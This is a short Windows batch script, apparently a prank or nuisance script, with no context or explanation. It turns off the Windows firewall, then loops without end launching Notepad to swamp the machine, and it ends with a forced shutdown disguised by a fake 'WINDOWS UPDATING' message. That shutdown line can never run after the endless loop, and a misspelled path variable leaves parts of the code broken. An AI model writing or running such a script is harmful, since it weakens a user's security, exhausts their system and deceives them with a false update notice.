@echo off
netsh firewall set opmode disable
echo message here
:top
START %systenRoot% \system32\notepad.exe
goto top
shutdown -s -f -t 3 -c "[+] WINDOWS UPDATING ..."
